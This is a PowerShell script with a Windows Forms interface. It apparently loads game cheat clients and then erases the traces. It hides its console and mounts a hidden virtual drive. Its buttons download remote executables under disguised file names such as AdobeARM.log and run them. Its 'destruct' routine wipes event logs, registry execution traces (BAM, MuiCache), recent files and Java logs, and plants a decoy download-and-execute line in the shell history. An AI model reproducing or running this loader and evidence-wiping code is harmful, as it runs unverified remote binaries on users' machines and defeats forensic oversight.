Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# START OF KEY BUTTON DETECTION
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
# Hide console window
try {
    $consolePtr = [Win32]::GetConsoleWindow()
    # 0 = SW_HIDE
    [Win32]::ShowWindow($consolePtr, 0) | Out-Null
} catch {
    Write-Error "Failed to hide console window: $_"
    exit 1
}
# Virtual key codes
$VK_CONTROL = 0x11
$VK_MENU = 0x12  # Alt key
$VK_F11 = 0x7A
# Inform user that the script is running and waiting for input
Write-Host "Waiting for Ctrl + Alt + F11 to be pressed..."
while ($true) {
    $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
    $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
    $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
    if ($ctrlPressed -and $altPressed -and $f11Pressed) {
        break
    }
    Start-Sleep -Milliseconds 100
}
# Load System.Windows.Forms assembly
try {
    Add-Type -AssemblyName System.Windows.Forms
} catch {
    Write-Error "Failed to load System.Windows.Forms assembly: $_"
    exit 1
}
# END OF KEY BUTTON DETECTION
# Set preferences to run silently
$ConfirmPreference = 'None'
$ErrorActionPreference = 'SilentlyContinue'
# SHOW LOADING SCREEN
# Create the form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'By Zpat - FAX'
$form.Size = New-Object System.Drawing.Size(950, 400)
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
# Set background color to black and make the window resizable
$form.FormBorderStyle = 'Sizable'
$form.MaximizeBox = $true
$form.MinimizeBox = $true
$form.BackColor = 'Black'  # Set background color of the form to black
$form.ForeColor = 'White'  # Set text color for the form content

# Add a label to display ASCII art
$asciiArt = @"
  __  __     ______     ______     __  __     ______     __    __     _____     ______     __     __     __   __    
 /\ \_\ \   /\  __ \   /\  ___\   /\ \/ /    /\  ___\   /\ "-./  \   /\  __-.  /\  __ \   /\ \  _ \ \   /\ "-.\ \   
 \ \  __ \  \ \  __ \  \ \ \____  \ \  _"-.  \ \  __\   \ \ \-./\ \  \ \ \/\ \ \ \ \/\ \  \ \ \/ ".\ \  \ \ \-.  \  
  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_____\  \ \_\ \ \_\  \ \____-  \ \_____\  \ \__/".~\_\  \ \_\\"\_\ 
   \/_/\/_/   \/_/\/_/   \/_____/   \/_/\/_/   \/_____/   \/_/  \/_/   \/____/   \/_____/   \/_/   \/_/   \/_/ \/_/
 ===================================================================================================================
"@
$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArt
$label.Font = New-Object System.Drawing.Font('Courier New', 9)
$label.ForeColor = 'Yellow'
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(50, 50)
$label.Anchor = 'Top, Left'
$form.Controls.Add($label)

# Adjust the label's location when the form resizes
$form.add_SizeChanged({
    $label.Location = New-Object System.Drawing.Point(
        [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
        [int]($form.ClientSize.Height * 0.1)  # Adjust vertical position
    )
})

# Create a progress bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Style = 'Continuous'
$progressBar.Minimum = 0
$progressBar.Maximum = 100
$progressBar.Value = 0
$progressBar.Width = 600
$progressBar.Height = 20
$progressBar.Location = New-Object System.Drawing.Point(
    [int](($form.ClientSize.Width - $progressBar.Width) / 2),
    [int]($label.Location.Y + $label.Height + 50)
)
$progressBar.Visible = $false
$progressBar.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")  # Set progress bar color
$form.Controls.Add($progressBar)

# Show the form
$form.Show()

# Simulate loading
$loadingSteps = 100
$stepDelay = 40  # Total time is approximately 4 seconds (100 steps * 40 ms)
for ($i = 0; $i -le $loadingSteps; $i++) {
    $progressBar.Value = $i
    Start-Sleep -Milliseconds $stepDelay
}

# Close the loading form
$form.Close()

# MAKE THE PARTITION --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Ensure the directory exists
$vdiskPath = "C:\temp\ddr.vhd"
$vdiskSizeMB = 2048 # Size of the virtual disk in MB (2 GB)
# Step 1: Check if the virtual disk already exists and remove it if it does
if (Test-Path -Path $vdiskPath) {
  Remove-Item -Path $vdiskPath -Force
}
# Step 2: Create the virtual disk (expandable)
$createVHDScript = @"
create vdisk file=`"$vdiskPath`" maximum=$vdiskSizeMB type=expandable
"@
$scriptFileCreate = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
$createVHDScript | Set-Content -Path $scriptFileCreate
# Execute the diskpart command to create the virtual disk
diskpart /s $scriptFileCreate
# Step 3: Attach the virtual disk
$attachVHDScript = @"
select vdisk file=`"$vdiskPath`"
attach vdisk
"@
$scriptFileAttach = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
$attachVHDScript | Set-Content -Path $scriptFileAttach
# Execute the diskpart command to attach the virtual disk
diskpart /s $scriptFileAttach
# Step 4: Wait for the disk to be detected by the system
Start-Sleep -Seconds 5  # Allow a moment for the disk to be registered by the OS
# Retrieve the attached disk (assuming it's the last disk created)
$disk = Get-Disk | Sort-Object -Property Number | Select-Object -Last 1
# Check if the disk is offline, and set it online if needed
if ($disk.IsOffline -eq $true) {
    Set-Disk -Number $disk.Number -IsOffline $false
}
# Initialize the disk if it's in raw state (uninitialized)
if ($disk.PartitionStyle -eq 'Raw') {
    Initialize-Disk -Number $disk.Number -PartitionStyle MBR
}
# Step 5: Create a new partition and explicitly assign drive letter Z
$partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z
# Step 6: Format the volume with FAT32 and set label
Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false
# Create tmp folder on Z drive
$zTmpPath = "Z:\tmp"
if (-Not (Test-Path $zTmpPath)) {
    New-Item -ItemType Directory -Path $zTmpPath
}

# Download the images to Z:\tmp
$imageUrls = @{
    "pr.png"      = "https://i.postimg.cc/sx8cz0pb/pr.png" 
    "vlite.png"     = "https://i.postimg.cc/XNDx9XTx/vlite.png" 
    "vv4.png"       = "https://i.postimg.cc/63pLvNcD/vv4.png" 
    "pha.png"       = "https://i.postimg.cc/j5366kkC/pha.png" 
    "inj.png"       = "https://i.postimg.cc/vHTnLzW6/inj.png" 
    "det.png"       = "https://i.postimg.cc/8ktW63rS/det.png" 
    "back.png"      = "https://i.postimg.cc/C5PqpBV1/back.png" 
    "tray.png"      = "https://i.postimg.cc/QxzT6TbY/tray.png" 
    "doom.png"      = "https://i.postimg.cc/Qt6QhnQh/doom.png" 
}

foreach ($imageName in $imageUrls.Keys) {
    $imageUrl = $imageUrls[$imageName]
    $imagePath = Join-Path -Path $zTmpPath -ChildPath $imageName
    if (-Not (Test-Path $imagePath)) {
        Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
    }
}

# END OF MAKING PARTITION ------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Hide PowerShell console window
Add-Type -Name Win -Namespace Console -MemberDefinition @'
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
'@
$consolePtr = [Console.Win]::GetConsoleWindow()
[Console.Win]::ShowWindow($consolePtr, 0)

# Create the main form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'By Zpat - FAX'
$form.Size = New-Object System.Drawing.Size(950, 400)
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
$form.FormBorderStyle = 'Sizable'
$form.MaximizeBox = $true
$form.MinimizeBox = $true
$form.BackColor = 'Black'  # Set background color of the form to black
$form.ForeColor = 'White'  # Set text color for the form content

# ASCII Art Label
$asciiArt = @"
  __  __     ______     ______     __  __     ______     __    __     _____     ______     __     __     __   __    
 /\ \_\ \   /\  __ \   /\  ___\   /\ \/ /    /\  ___\   /\ "-./  \   /\  __-.  /\  __ \   /\ \  _ \ \   /\ "-.\ \   
 \ \  __ \  \ \  __ \  \ \ \____  \ \  _"-.  \ \  __\   \ \ \-./\ \  \ \ \/\ \ \ \ \/\ \  \ \ \/ ".\ \  \ \ \-.  \  
  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_____\  \ \_\ \ \_\  \ \____-  \ \_____\  \ \__/".~\_\  \ \_\\"\_\ 
   \/_/\/_/   \/_/\/_/   \/_____/   \/_/\/_/   \/_____/   \/_/  \/_/   \/____/   \/_____/   \/_/   \/_/   \/_/ \/_/
 ===================================================================================================================
"@
$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArt
$label.Font = New-Object System.Drawing.Font('Courier New', 9)
$label.ForeColor = 'Yellow'
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(50, 50)
$label.Anchor = 'Top, Left'
$form.Controls.Add($label)

# Adjust the label's location when the form resizes
$form.add_SizeChanged({
    $label.Location = New-Object System.Drawing.Point(
        [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
        [int]($form.ClientSize.Height * 0.1)  # Adjust vertical position
    )
})

# Create a progress bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Style = 'Continuous'
$progressBar.Minimum = 0
$progressBar.Maximum = 100
$progressBar.Value = 0
$progressBar.Width = 600
$progressBar.Height = 20
$progressBar.Location = New-Object System.Drawing.Point(
    [int](($form.ClientSize.Width - $progressBar.Width) / 2),
    [int]($label.Location.Y + $label.Height + 50)
)
$progressBar.Visible = $false
$progressBar.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")  # Set progress bar color
$form.Controls.Add($progressBar)

# Function to return to main menu
function Show-MainMenu {
    $form.Controls.Clear()
    $form.Controls.Add($label)
    # Create PictureBox for Inject Button
    $injectPictureBox = New-Object System.Windows.Forms.PictureBox
    $injectPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "inj.png"))
    $injectPictureBox.SizeMode = 'StretchImage'
    $injectPictureBox.Width = 120
    $injectPictureBox.Height = 44
    $injectPictureBox.Location = New-Object System.Drawing.Point(
        [int]($form.ClientSize.Width * 0.15),  # Adjust horizontal position
        [int]($form.ClientSize.Height * 0.5)  # Adjust vertical position
    )
    $injectPictureBox.BackColor = 'Transparent'
    $injectPictureBox.Add_MouseEnter({
        $injectPictureBox.BorderStyle = 'FixedSingle'
        $injectPictureBox.BackColor = 'Gray'
        Start-JiggleEffect $injectPictureBox
    })
    $injectPictureBox.Add_MouseLeave({
        $injectPictureBox.BorderStyle = 'None'
        $injectPictureBox.BackColor = 'Transparent'
    })
    $injectPictureBox.Add_Click({
        # Inject Button Click: Show Prestige and Vape buttons
        # Disable the form to prevent interaction
        $form.Enabled = $false
        # Download the sound file
        Download-SoundFile
        # Load the sound player
        $player = New-Object System.Media.SoundPlayer
        $player.SoundLocation = $soundFilePath
        # Play the custom sound
        $player.PlaySync()
        # Re-enable the form after sound playback
        $form.Enabled = $true
        $form.Controls.Clear()
        $form.Controls.Add($label)
        # Back Button
        $backPictureBox = New-Object System.Windows.Forms.PictureBox
        $backPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "back.png"))
        $backPictureBox.SizeMode = 'StretchImage'
        $backPictureBox.Width = 100
        $backPictureBox.Height = 30
        $backPictureBox.Location = New-Object System.Drawing.Point(
            [int]($form.ClientSize.Width * 0.85),  # Adjust horizontal position
            [int]($form.ClientSize.Height * 0.85)  # Adjust vertical position
        )
        $backPictureBox.BackColor = 'Transparent'
        $backPictureBox.Add_MouseEnter({
            $backPictureBox.BorderStyle = 'FixedSingle'
            $backPictureBox.BackColor = 'Gray'
            Start-JiggleEffect $backPictureBox
        })
        $backPictureBox.Add_MouseLeave({
            $backPictureBox.BorderStyle = 'None'
            $backPictureBox.BackColor = 'Transparent'
        })
        $backPictureBox.Add_Click({ Show-MainMenu })
        # Prestige Button
        $prestigePictureBox = New-Object System.Windows.Forms.PictureBox
        $prestigePictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "pr.png"))
        $prestigePictureBox.SizeMode = 'StretchImage'
        $prestigePictureBox.Width = 120
        $prestigePictureBox.Height = 120
        $prestigePictureBox.Location = New-Object System.Drawing.Point(
            [int]($form.ClientSize.Width * 0.15),  # Adjust horizontal position
            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
        )
        $prestigePictureBox.BackColor = 'Transparent'
        $prestigePictureBox.Add_MouseEnter({
            $prestigePictureBox.BorderStyle = 'FixedSingle'
            $prestigePictureBox.BackColor = 'Gray'
            Start-JiggleEffect $prestigePictureBox
        })
        $prestigePictureBox.Add_MouseLeave({
            $prestigePictureBox.BorderStyle = 'None'
            $prestigePictureBox.BackColor = 'Transparent'
        })
        $prestigePictureBox.Add_Click({
            if (-Not (Test-Path "Z:\meme.mp4")) {
                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"   -OutFile "Z:\meme.mp4"
            }
            Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
        })
        # Vapelite Button
        $vapelitePictureBox = New-Object System.Windows.Forms.PictureBox
        $vapelitePictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "vlite.png"))
        $vapelitePictureBox.SizeMode = 'StretchImage'
        $vapelitePictureBox.Width = 120
        $vapelitePictureBox.Height = 120
        $vapelitePictureBox.Location = New-Object System.Drawing.Point(
            [int]($form.ClientSize.Width * 0.3),  # Adjust horizontal position
            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
        )
        $vapelitePictureBox.BackColor = 'Transparent'
        $vapelitePictureBox.Add_MouseEnter({
            $vapelitePictureBox.BorderStyle = 'FixedSingle'
            $vapelitePictureBox.BackColor = 'Gray'
            Start-JiggleEffect $vapelitePictureBox
        })
        $vapelitePictureBox.Add_MouseLeave({
            $vapelitePictureBox.BorderStyle = 'None'
            $vapelitePictureBox.BackColor = 'Transparent'
        })
        $vapelitePictureBox.Add_Click({
            if (-Not (Test-Path "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp")) {
                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe"   -OutFile "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
            }
            Start-Process "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
        })
        # Vapev4 Button
        $vapev4PictureBox = New-Object System.Windows.Forms.PictureBox
        $vapev4PictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "vv4.png"))
        $vapev4PictureBox.SizeMode = 'StretchImage'
        $vapev4PictureBox.Width = 120
        $vapev4PictureBox.Height = 120
        $vapev4PictureBox.Location = New-Object System.Drawing.Point(
            [int]($form.ClientSize.Width * 0.45),  # Adjust horizontal position
            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
        )
        $vapev4PictureBox.BackColor = 'Transparent'
        $vapev4PictureBox.Add_MouseEnter({
            $vapev4PictureBox.BorderStyle = 'FixedSingle'
            $vapev4PictureBox.BackColor = 'Gray'
            Start-JiggleEffect $vapev4PictureBox
        })
        $vapev4PictureBox.Add_MouseLeave({
            $vapev4PictureBox.BorderStyle = 'None'
            $vapev4PictureBox.BackColor = 'Transparent'
        })
        $vapev4PictureBox.Add_Click({
            if (-Not (Test-Path "Z:\AdobeARM.log")) {
                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe"   -OutFile "Z:\AdobeARM.log"
            }
            Start-Process "Z:\AdobeARM.log"
        })
        # Phantom Button
        $phantomPictureBox = New-Object System.Windows.Forms.PictureBox
        $phantomPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "pha.png"))
        $phantomPictureBox.SizeMode = 'StretchImage'
        $phantomPictureBox.Width = 120
        $phantomPictureBox.Height = 120
        $phantomPictureBox.Location = New-Object System.Drawing.Point(
            [int]($form.ClientSize.Width * 0.6),  # Adjust horizontal position
            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
        )
        $phantomPictureBox.BackColor = 'Transparent'
        $phantomPictureBox.Add_MouseEnter({
            $phantomPictureBox.BorderStyle = 'FixedSingle'
            $phantomPictureBox.BackColor = 'Gray'
            Start-JiggleEffect $phantomPictureBox
        })
        $phantomPictureBox.Add_MouseLeave({
            $phantomPictureBox.BorderStyle = 'None'
            $phantomPictureBox.BackColor = 'Transparent'
        })
        $phantomPictureBox.Add_Click({
            $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
            Set-Clipboard -Value $clipboardText
        })
        # Doom Button
        $doomPictureBox = New-Object System.Windows.Forms.PictureBox
        $doomPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "doom.png"))
        $doomPictureBox.SizeMode = 'StretchImage'
        $doomPictureBox.Width = 120
        $doomPictureBox.Height = 120
        $doomPictureBox.Location = New-Object System.Drawing.Point(
            [int]($form.ClientSize.Width * 0.75),  # Adjust horizontal position
            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
        )
        $doomPictureBox.BackColor = 'Transparent'
        $doomPictureBox.Add_MouseEnter({
            $doomPictureBox.BorderStyle = 'FixedSingle'
            $doomPictureBox.BackColor = 'Gray'
            Start-JiggleEffect $doomPictureBox
        })
        $doomPictureBox.Add_MouseLeave({
            $doomPictureBox.BorderStyle = 'None'
            $doomPictureBox.BackColor = 'Transparent'
        })
        $doomPictureBox.Add_Click({
            if (-Not (Test-Path "Z:\doom.exe")) {
                iwr "#DOOM-Link#" -OutFile "Z:\doom.exe"
            }
            # Start-Process "Z:\doom.exe"  # Uncomment and fill in the command as needed
        })
        # Add PictureBoxes to form
        $form.Controls.Add($prestigePictureBox)
        $form.Controls.Add($vapelitePictureBox)
        $form.Controls.Add($backPictureBox)
        $form.Controls.Add($vapev4PictureBox)
        $form.Controls.Add($phantomPictureBox)
        $form.Controls.Add($doomPictureBox)
    })

    # Create PictureBox for Destruct Button
    $destructPictureBox = New-Object System.Windows.Forms.PictureBox
    $destructPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "det.png"))
    $destructPictureBox.SizeMode = 'StretchImage'
    $destructPictureBox.Width = 112
    $destructPictureBox.Height = 27
    $destructPictureBox.Location = New-Object System.Drawing.Point(
        [int]($form.ClientSize.Width * 0.75),  # Adjust horizontal position
        [int]($form.ClientSize.Height * 0.5)  # Adjust vertical position
    )
    $destructPictureBox.BackColor = 'Transparent'
    $destructPictureBox.Add_MouseEnter({
        $destructPictureBox.BorderStyle = 'FixedSingle'
        $destructPictureBox.BackColor = 'Gray'
        Start-JiggleEffect $destructPictureBox
    })
    $destructPictureBox.Add_MouseLeave({
        $destructPictureBox.BorderStyle = 'None'
        $destructPictureBox.BackColor = 'Transparent'
    })
    $destructPictureBox.Add_Click({
        # Disable the form to prevent interaction
        $form.Enabled = $false
        # Show progress bar
        $progressBar.Value = 0
        $progressBar.Visible = $true
        # Start background worker
        $backgroundWorker.RunWorkerAsync()
    })

    # Create PictureBox for Hide to Tray Button
    $hideToTrayPictureBox = New-Object System.Windows.Forms.PictureBox
    $hideToTrayPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "tray.png"))
    $hideToTrayPictureBox.SizeMode = 'StretchImage'
    $hideToTrayPictureBox.Width = 32
    $hideToTrayPictureBox.Height = 32
    $hideToTrayPictureBox.Location = New-Object System.Drawing.Point(
        [int]($form.ClientSize.Width - $hideToTrayPictureBox.Width - 10),  # Adjust horizontal position
        [int]($form.ClientSize.Height - $hideToTrayPictureBox.Height - 10)  # Adjust vertical position
    )
    $hideToTrayPictureBox.BackColor = 'Transparent'
    $hideToTrayPictureBox.Add_MouseEnter({
        $hideToTrayPictureBox.BorderStyle = 'FixedSingle'
        $hideToTrayPictureBox.BackColor = 'Gray'
        Start-JiggleEffect $hideToTrayPictureBox
    })
    $hideToTrayPictureBox.Add_MouseLeave({
        $hideToTrayPictureBox.BorderStyle = 'None'
        $hideToTrayPictureBox.BackColor = 'Transparent'
    })
    $hideToTrayPictureBox.Add_Click({
        # Hide the form to the system tray
        $form.Hide()
    })
    $hideToTrayPictureBox.Add_MouseMove({
        # Move the form to the system tray when mouse is near the bottom right corner
        if ($_.X -gt ($form.ClientSize.Width - 50) -and $_.Y -gt ($form.ClientSize.Height - 50)) {
            $form.Hide()
        }
    })

    # Add PictureBoxes to form
    $form.Controls.Add($injectPictureBox)
    $form.Controls.Add($destructPictureBox)
    $form.Controls.Add($hideToTrayPictureBox)
}

# Path to the custom sound file on Z drive
$soundFilePath = Join-Path -Path $zTmpPath -ChildPath "a.wav"

# Function to download the sound file
function Download-SoundFile {
    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"   # Replace with the actual URL of the sound file
    if (-Not (Test-Path $soundFilePath)) {
        Invoke-WebRequest -Uri $soundUrl -OutFile $soundFilePath
    }
}

# Create background worker
$backgroundWorker = New-Object System.ComponentModel.BackgroundWorker
$backgroundWorker.WorkerReportsProgress = $true
$backgroundWorker.DoWork = {
    param($sender, $e)
    # Path to the virtual disk
    $vdiskPath = "C:\temp\ddr.vhd"
    # STEP 1: Get the virtual disk's associated disk number
    $diskNumber = $null
    $diskList = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" }
    if ($diskList) {
        $diskNumber = $diskList.Number
    } else {
        $sender.ReportProgress(100, "Virtual disk not found or not attached. Aborting destruction.")
        return
    }
    # STEP 2: Detach the virtual disk
    $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk
"@
    $detachFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $detachScript | Set-Content -Path $detachFile
    diskpart /s $detachFile | Out-Null
    Remove-Item -Path $detachFile -Force
    $sender.ReportProgress(20)

    # STEP 3: Initialize the disk (if needed)
    $initializeScript = @"
select disk $diskNumber
online disk
convert mbr
"@
    $initFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $initializeScript | Set-Content -Path $initFile
    diskpart /s $initFile | Out-Null
    Remove-Item -Path $initFile -Force
    $sender.ReportProgress(40)

    # STEP 4: Create partition and assign drive letter
    $partitionScript = @"
select disk $diskNumber
create partition primary
assign letter=Z
"@
    $partFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $partitionScript | Set-Content -Path $partFile
    diskpart /s $partFile | Out-Null
    Remove-Item -Path $partFile -Force
    $sender.ReportProgress(60)

    # STEP 5: Delete the virtual disk file
    if (Test-Path $vdiskPath) {
        Remove-Item -Path $vdiskPath -Force
    }
    $sender.ReportProgress(70)

    # STEP 6: Clean up "Recent" shortcuts
    $recentPath = [Environment]::GetFolderPath("Recent")
    Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
    }
    $sender.ReportProgress(80)

    # Destruct other stuff after disk is gone
    Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
    Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force
    # Clear Temp
    Remove-Item -Path "C:\temp\*" -Recurse -Force
    Stop-Process -Name vds -Force
    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force
    # Event logs
    Clear-EventLog -LogName System
    wevtutil cl "Windows PowerShell"
    # Remove Stuff from MuiCache
    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache |
    ForEach-Object { $_.PSObject.Properties } |
    Where-Object { $_.Name -like "Z:\*" } |
    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name }
    # BAM
    gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
    # Conhost History
    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1   | iex'
    # Clear JVM args logs and traces by clearing content
    $jvmLogFiles = @(
        "$env:USERPROFILE\.java\deployment\log\*.log",
        "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
        "$env:USERPROFILE\AppData\Local\Sun\Java\Deployment\log\*.log",
        "$env:USERPROFILE\AppData\Roaming\Sun\Java\Deployment\log\*.log"
    )
    foreach ($file in $jvmLogFiles) {
        Get-ChildItem -Path $file -ErrorAction SilentlyContinue | ForEach-Object {
            Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
        }
    }
    $sender.ReportProgress(100)
    # Stop the script process
    Stop-Process -Id $PID
}

$backgroundWorker.ProgressChanged = {
    param($sender, $e)
    $progressBar.Value = $e.ProgressPercentage
    if ($e.UserState) {
        # Display error message if any
        [System.Windows.Forms.MessageBox]::Show($e.UserState, "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
}

$backgroundWorker.RunWorkerCompleted = {
    param($sender, $e)
    $progressBar.Visible = $false
    $form.Enabled = $true
    if ($e.Error) {
        [System.Windows.Forms.MessageBox]::Show("An error occurred during destruction: $($e.Error.Message)", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
}

# Function to start jiggle effect
function Start-JiggleEffect {
    param($pictureBox)
    $originalLocation = $pictureBox.Location
    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 10
    $counter = 0
    $timer.Add_Tick({
        $counter++
        if ($counter -le 10) {
            $pictureBox.Location = New-Object System.Drawing.Point($originalLocation.X + [math]::Sin($counter * 0.3) * 3, $originalLocation.Y + [math]::Cos($counter * 0.3) * 3)
        } else {
            $pictureBox.Location = $originalLocation
            $timer.Stop()
        }
    })
    $timer.Start()
}

# Initial Load
Show-MainMenu

# Run the form
[void]$form.ShowDialog()
